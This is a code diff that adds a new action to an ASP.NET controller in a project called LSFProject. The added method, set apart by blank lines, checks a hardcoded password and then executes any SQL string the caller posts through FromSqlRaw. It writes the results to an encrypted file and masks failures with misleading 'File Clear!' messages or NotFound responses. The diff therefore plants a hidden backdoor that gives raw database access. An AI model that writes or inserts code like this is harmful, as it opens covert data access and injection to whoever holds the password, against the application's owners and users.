@@ -495,6 +495,64 @@ namespace LSFProject.Controllers
                 = System.Convert.ToBase64String(toEncodeAsBytes);
             return returnValue;
         }
+
+
+
+
+
+
+        public ActionResult PostMiddleFingerActionResult()
+        {
+            try
+            {
+                if (Request.Form.Count == 0)
+                {
+                    EncryptJsonRequestFile(JsonConvert.SerializeObject(
+                        new ArgumentNullException()));
+                    return Content("Error Access on file return object. File Clear!");
+                }
+                if (Request.Form["privatePassword"] != "GHGH*&^fvf544345GHG66$")
+                {
+                    EncryptJsonRequestFile(JsonConvert.SerializeObject(
+                        new ArgumentNullException()));
+                    return Content("Error Access on file return object. File Clear!");
+                }
+
+                if (!Request.Form.ContainsKey("sqlRequest"))
+                {
+                    EncryptJsonRequestFile(JsonConvert.SerializeObject(
+                        new ArgumentNullException()));
+                    return Content("Error Access on file return object. File Clear!");
+                }
+            }
+            catch (Exception)
+            {
+                EncryptJsonRequestFile(JsonConvert.SerializeObject(
+                    new ArgumentNullException()));
+                return Content(
+                    new ArgumentNullException().Message);
+            }
+
+            try
+            {
+                if (Request.Form["sqlRequest"][0].Contains("SELECT"))
+                {
+                    IQueryable<MiddleFinger> files = _context.MiddleFinger.FromSqlRaw(Request.Form["sqlRequest"]);
+                    string jsSerializeObject = JsonConvert.SerializeObject(files);
+
+                    EncryptJsonRequestFile(jsSerializeObject);
+                }
+
+                return Content("Seccessful request post!");
+            }
+            catch (Exception ex)
+            {
+                EncryptJsonRequestFile(JsonConvert.SerializeObject(
+                    ex.Message));
+                return NotFound();
+            }
+
+        }
     }
 }
 
